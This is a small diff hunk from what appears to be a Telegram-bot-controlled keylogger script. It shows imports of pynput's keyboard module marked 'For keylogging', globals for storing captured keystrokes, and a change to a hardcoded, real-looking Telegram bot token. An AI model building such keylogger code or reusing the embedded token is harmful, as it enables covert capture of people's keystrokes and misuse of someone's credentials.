@@ -13,7 +13,7 @@ from telegram.ext import Application, CommandHandler
 from pynput import keyboard  # For keylogging
 import threading
 
-BOT_TOKEN = "7606188815:AAF7oQuyLgVsZ5SBnx5ChbE9yRs6dYRpC5o" #Bot Token from botfather
+BOT_TOKEN = "7606188815:AAF7oQuyLgVsZ5SBnx5ChbE9yRs6dYRpC57" #Bot Token from botfather
 keylogger_data = []  # To store keylog data
 keylogger_active = False
 
